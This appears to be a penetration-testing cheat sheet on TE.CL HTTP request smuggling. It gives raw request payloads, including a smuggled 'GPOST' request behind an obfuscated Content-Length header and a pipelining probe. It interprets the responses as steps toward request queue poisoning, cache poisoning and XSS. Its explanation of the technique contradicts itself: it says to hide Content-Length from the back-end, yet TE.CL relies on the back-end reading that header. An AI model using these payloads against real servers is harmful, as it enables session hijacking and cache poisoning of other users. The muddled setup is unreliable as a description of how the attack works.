# TE.CL Desync Attacks

Front-end uses Transfer-Encoding while Back-end uses Content-Length

## Classic TE.CL >>> RQP
- Hide Content-Length from back-end
  - V-H discrepancy exploitation
  - Leading space: ` Content-Length: 4`

## Test Request
```
POST / HTTP/1.1
Host: example.com
 Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

## Expected Results
- 200 OK with normal page >>> No desync
  - Front-end blocked request
  - Back-end saw Content-Length header
- 404 Not Found for /gpost >>> Desync successful
  - Back-end processed GPOST as separate request
  - Next step >>> RQP || Cache poison || XSS gadget
- Timeout >>> Back-end waiting
  - Waiting for more data based on Content-Length
  - Adjust Content-Length value

## TE.CL with Pipeline Tolerance >>> RQP
- Some servers tolerate pipelined requests

## Pipeline Test Request
```
POST / HTTP/1.1
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: example.com
```

## Pipeline Test Results
- Two responses (200, 404) >>> Server allows pipelining
  - Can chain attacks
  - Next step >>> RQP
- Single 200 response >>> No pipelining
  - Standard TE.CL may still work
  - Try classic approach
- Connection closed >>> Server rejects
  - Pipelined requests blocked
  - Use different technique
